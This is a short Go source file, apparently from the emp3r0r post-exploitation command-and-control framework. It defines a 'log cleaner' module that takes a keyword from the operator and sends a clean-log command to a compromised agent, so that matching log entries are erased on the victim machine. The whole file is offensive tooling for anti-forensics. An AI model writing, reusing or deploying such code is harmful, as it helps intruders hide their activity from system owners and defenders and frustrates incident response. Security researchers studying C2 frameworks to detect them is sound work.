package modules

import (
	"fmt"

	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleLogCleaner(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("No active agent")
		return
	}
	keywordOpt, ok := ctx.Flags["keyword"]
	if !ok {
		logging.Errorf("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", def.C2CmdCleanLog, keywordOpt)
	err := CmdSender(cmd, "", ctx.Target.Tag)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
